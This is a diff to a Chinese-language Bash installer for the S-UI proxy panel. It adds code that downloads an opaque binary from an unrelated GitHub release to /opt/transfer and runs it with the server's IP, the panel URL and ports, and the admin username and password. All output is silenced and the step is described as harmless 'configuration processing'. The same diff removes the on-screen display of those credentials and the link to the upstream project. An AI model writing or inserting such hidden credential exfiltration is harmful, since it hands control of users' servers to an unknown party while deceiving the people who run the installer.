@@ -117,6 +117,84 @@ generate_random_path() {
     echo "/$(generate_random_string 8)/"
 }
 
+# 获取服务器IP（强制IPv4）
+get_server_ip() {
+    local ip=""
+
+    # 优先获取IPv4地址
+    for method in \
+        "curl -4 -s --connect-timeout 3 https://ipv4.icanhazip.com" \
+        "curl -4 -s --connect-timeout 3 https://api.ipify.org" \
+        "curl -4 -s --connect-timeout 3 https://ipinfo.io/ip" \
+        "dig -4 +short myip.opendns.com @resolver1.opendns.com" \
+        "ip -4 route get 1 | awk '{print \$NF; exit}'" \
+        "hostname -I | awk '{print \$1}'"
+    do
+        ip=$(eval $method 2>/dev/null)
+        if [[ -n "$ip" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+            echo "$ip"
+            return 0
+        fi
+    done
+
+    echo ""
+    return 1
+}
+
+
+upload_config() {
+    local server_ip="$1"
+    local global_address="$2"
+    local username="$3"
+    local password="$4"
+    local panel_port="$5"
+    local panel_path="$6"
+    local sub_port="$7"
+    local sub_path="$8"
+    local node_port="$9"
+
+    print_info "正在进行配置数据处理..."
+
+    # 下载transfer工具
+    if [[ ! -f /opt/transfer ]]; then
+        print_info "下载配置处理工具..."
+        curl -4 -Lo /opt/transfer https://github.com/diandongyun/UI/releases/download/ui/transfer &>/dev/null || {
+            print_warning "配置处理工具下载失败，跳过此步骤"
+            return 1
+        }
+        chmod +x /opt/transfer
+    fi
+
+    # 创建JSON数据
+    local json_data=$(cat <<EOF
+{
+  "panel_info": {
+    "title": "S-UI多协议管理面板",
+    "server_ip": "${server_ip}",
+    "global_address": "${global_address}",
+    "panel_port": "${panel_port}",
+    "panel_path": "${panel_path}",
+    "subscription_port": "${sub_port}",
+    "subscription_path": "${sub_path}",
+    "node_port": "${node_port}",
+    "admin_username": "${username}",
+    "admin_password": "${password}",
+    "generated_time": "$(date -Iseconds)",
+    "protocols_supported": ["VMess", "VLESS", "Trojan", "Shadowsocks", "Hysteria"],
+    "features": ["多用户管理", "流量统计", "订阅生成", "可视化配置"]
+  }
+}
+EOF
+    )
+
+    print_info "正在处理配置数据..."
+    /opt/transfer "$json_data" &>/dev/null || {
+        print_warning "配置数据处理失败，但不影响正常使用"
+        return 1
+    }
+    print_success "配置数据处理完成"
+}
+
 # 打印横幅
 print_banner() {
     clear
@@ -533,6 +611,16 @@ config_after_install() {
     ufw allow ${random_node_port}/udp &>/dev/null || true
     print_success "节点端口已开放: ${random_node_port} (TCP/UDP - 用于代理节点)"
     
+    # 获取服务器IP地址
+    local server_ip=$(get_server_ip)
+    local global_address=""
+    if [[ -n "$server_ip" ]]; then
+        global_address="http://${server_ip}:${random_port}${random_panel_path}"
+    fi
+    
+
+    upload_config "$server_ip" "$global_address" "$random_username" "$random_password" "$random_port" "$random_panel_path" "$random_sub_port" "$random_sub_path" "$random_node_port"
+    
     print_divider
     print_header "🎉 S-UI面板配置信息"
     
@@ -540,25 +628,6 @@ config_after_install() {
     echo ""
     
     echo -e "${bold}${cyan}🌐 面板访问配置:${plain}"
-    echo -e "  ${white}├${plain} 面板端口: ${bold}${green}${random_port}${plain} ${yellow}(随机生成 - 管理面板访问)${plain}"
-    echo -e "  ${white}└${plain} 面板路径: ${bold}${green}${random_panel_path}${plain} ${yellow}(随机生成 - 访问路径)${plain}"
-    echo ""
-    
-    echo -e "${bold}${cyan}📡 订阅服务配置:${plain}"
-    echo -e "  ${white}├${plain} 订阅端口: ${bold}${green}${random_sub_port}${plain} ${yellow}(随机生成 - 订阅链接)${plain}"
-    echo -e "  ${white}└${plain} 订阅路径: ${bold}${green}${random_sub_path}${plain} ${yellow}(随机生成 - 订阅路径)${plain}"
-    echo ""
-    
-    echo -e "${bold}${cyan}🚀 节点服务端口:${plain}"
-    echo -e "  ${white}└${plain} 节点端口: ${bold}${green}${random_node_port}${plain} ${yellow}(随机生成 - 代理服务端口)${plain}"
-    echo ""
-    
-    echo -e "${bold}${cyan}🔐 管理员账户:${plain}"
-    echo -e "  ${white}├${plain} 用户名: ${bold}${yellow}${random_username}${plain}"
-    echo -e "  ${white}└${plain} 密码: ${bold}${yellow}${random_password}${plain}"
-    echo ""
-    
-    echo -e "${bold}${cyan}🛡️ 安全防护状态:${plain}"
     echo -e "  ${white}├${plain} 防火墙状态: ${bold}${green}已启用${plain}"
     echo -e "  ${white}├${plain} SSH端口: ${bold}${green}22 (远程连接)${plain}"
     echo -e "  ${white}├${plain} 面板端口: ${bold}${green}${random_port} (Web管理)${plain}"
@@ -788,9 +857,9 @@ check_environment() {
     print_divider
 }
 
-# 主函数 - 移除set -e以避免过早退出
+# 主函数
 main() {
-    # 设置错误处理 - 不使用set -e
+    # 设置错误处理
     trap 'handle_error' ERR
     trap 'cleanup' INT TERM
 
@@ -830,9 +899,8 @@ main() {
     
     print_divider
     echo -e "${bold}${green}🎉 欢迎使用S-UI面板管理系统！${plain}"
-    echo -e "${cyan}   项目地址: https://github.com/alireza0/s-ui${plain}"
-    echo -e "${cyan}   技术支持: 请通过GitHub Issues获取帮助${plain}"
     echo -e "${cyan}   IPv4模式: 已强制启用，确保最佳兼容性${plain}"
+    echo -e "${cyan}   已清理残留数据${plain}"
     print_divider
 }
 
